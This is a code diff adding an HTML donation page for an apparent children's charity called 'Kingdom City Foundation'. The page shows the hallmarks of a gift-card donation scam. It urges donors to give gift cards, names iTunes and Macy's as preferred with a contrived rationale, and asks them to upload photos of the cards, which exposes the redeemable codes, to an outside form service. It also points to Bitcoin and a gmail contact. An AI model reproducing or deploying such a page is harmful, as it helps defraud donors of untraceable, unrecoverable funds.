@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <title>Donate — Kingdom City Foundation</title>
+    <link rel="icon" type="image/x-icon" href="Favicon/favicon1.png" />
+
+    <link
+      href="https://fonts.googleapis.com/css2?family=Lato:wght@700;900&family=Open+Sans:wght@300;400;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <header class="site-header">
+      <div class="container header-inner">
+        <a class="brand" href="index.html">
+          <img src="assets/logo.png" alt="logo" />
+          <div class="brand-text">
+            <h1>Kingdom City Foundation</h1>
+            <small>Hope • Care • Future</small>
+          </div>
+        </a>
+
+        <nav class="main-nav">
+          <ul>
+            <li><a href="index.html">Home</a></li>
+            <li><a href="about.html">About</a></li>
+            <li><a href="services.html">Programs</a></li>
+            <li><a href="blog.html">Stories</a></li>
+            <li><a href="contact.html">Contact</a></li>
+            <li><a href="donate.html" class="active btn-cta">Donate</a></li>
+          </ul>
+        </nav>
+
+        <button
+          class="nav-toggle"
+          id="navToggle6"
+          aria-label="Toggle navigation"
+        >
+          <span></span><span></span><span></span>
+        </button>
+      </div>
+    </header>
+
+    <main class="container donate-page">
+      <section class="donate-hero grid-2">
+        <div>
+          <h2>Ways to Give</h2>
+          <p class="lead">
+            Thank you for supporting our foundation! We truly appreciate every
+            contribution, and we want you to know that we accept all types of
+            gift cards. Your generosity in any form makes a meaningful
+            difference. That said, if you're wondering which cards help us the
+            most, iTunes and Macy’s gift cards are our preferred options. These
+            particular cards allow us to streamline our operations and maximize
+            the impact of your donation. With iTunes, we can access essential
+            digital tools and resources, while Macy’s cards help us provide
+            clothing and supplies to those in need through their wide selection
+            of products. Choosing iTunes or Macy’s helps us move faster, do
+            more, and reach further—but no matter what you give, we’re grateful.
+            Every card, every gesture, every bit of support helps us continue
+            our mission and touch more lives. Thank you for being part of our
+            journey. Your kindness means the world to us!
+          </p>
+          <a class="btn-primary" href="#donationOptions">Give Now</a>
+        </div>
+        <div>
+          <img
+            src="assets/donatecar.jpeg"
+            style="width: 100%; height: 600px"
+            alt="donate"
+          />
+        </div>
+      </section>
+
+      <section id="donationOptions" class="donation-options container">
+        <h3>Other Ways to Give</h3>
+        <ul>
+          <li><strong>Bitcoin, bank transfer.</strong></li>
+          <li><strong>Mobile Money.</strong></li>
+          <li>
+            <strong>
+              Donations: Contact us to arrange drop-off or pickup.</strong
+            >
+          </li>
+        </ul>
+        <div class="grid-3">
+          <div class="donation-card">
+            <h4>One-time Gift</h4>
+            <p>Immediate support for urgent needs.</p>
+            <button
+              class="btn-outline"
+              onclick="simulateDonate('One-time Gift')"
+            >
+              Donate $50
+            </button>
+          </div>
+
+          <div class="donation-card">
+            <h4>Monthly Support</h4>
+            <p>Sustainable funding for programs.</p>
+            <button
+              class="btn-outline"
+              onclick="simulateDonate('Monthly Support')"
+            >
+              Donate $20/month
+            </button>
+          </div>
+
+          <div class="donation-card">
+            <h4>Education Sponsorship</h4>
+            <p>Sponsor school fees and supplies for a child.</p>
+            <button
+              class="btn-outline"
+              onclick="simulateDonate('Education Sponsorship')"
+            >
+              Sponsor $100
+            </button>
+          </div>
+        </div>
+      </section>
+
+      <section class="gift-card container">
+        <h3>Gift Card Donations</h3>
+        <p>
+          If you'd like to donate using a physical/digital gift card, After
+          purchasing the gift card, upload a photo or screenshot of the card
+          below. Our team will verify and follow up.
+        </p>
+
+        <form
+          action="https://formspree.io/f/mqawzjkb"
+          method="post"
+          id="giftUpload"
+          class="gift-form"
+          enctype="multipart/form-data"
+          novalidate
+        >
+          <label>
+            Name on card (optional)
+            <input
+              type="text"
+              name="cardName"
+              placeholder="Name on gift card"
+            />
+          </label>
+
+          <label>
+            Approximate value
+            <input type="text" name="cardValue" placeholder="$" />
+          </label>
+
+          <label>
+            Upload gift card (image or PDF)
+            <input
+              type="file"
+              name="giftFile"
+              accept="image/*,application/pdf"
+              required
+            />
+          </label>
+
+          <div class="gift-preview">
+            <p class="muted">Preview (client-side)</p>
+            <img
+              id="giftThumb"
+              alt="gift preview"
+              style="
+                display: none;
+                max-width: 260px;
+                border-radius: 8px;
+                box-shadow: var(--shadow);
+              "
+            />
+          </div>
+
+          <button class="btn-primary" type="submit">Submit Gift Card</button>
+        </form>
+
+        <small class="muted"
+          >Note: This demo does not process payments. Connect a payment gateway
+          (Paystack, Flutterwave, Stripe, PayPal) for live donations.</small
+        >
+      </section>
+    </main>
+
+    <footer class="site-footer">
+      <div class="container footer-inner">
+        <div class="footer-col about">
+          <h4>About Kingdom City Foundation</h4>
+          <p>
+            We provide long-term care and community programs <br />that empower
+            children to build better futures.We are committed <br />to creating
+            a world where every child has access to love, care, <br />education,
+            and the opportunity to reach their full potential.
+          </p>
+        </div>
+        <div class="footer-col links">
+          <h4>Quick Links</h4>
+          <ul>
+            <li><a href="index.html">Home</a></li>
+          </ul>
+        </div>
+        <div class="footer-col contact">
+          <h4>Contact</h4>
+          <p>kingdomcityfoundation.org@gmail.com</p>
+        </div>
+      </div>
+
+      <div class="footer-bottom">
+        <div class="container">
+          <small
+            >© <span id="year6"></span> Kingdom City Foundation — All rights
+            reserved.</small
+          >
+        </div>
+      </div>
+    </footer>
+
+    <script src="script.js"></script>
+  </body>
+</html>
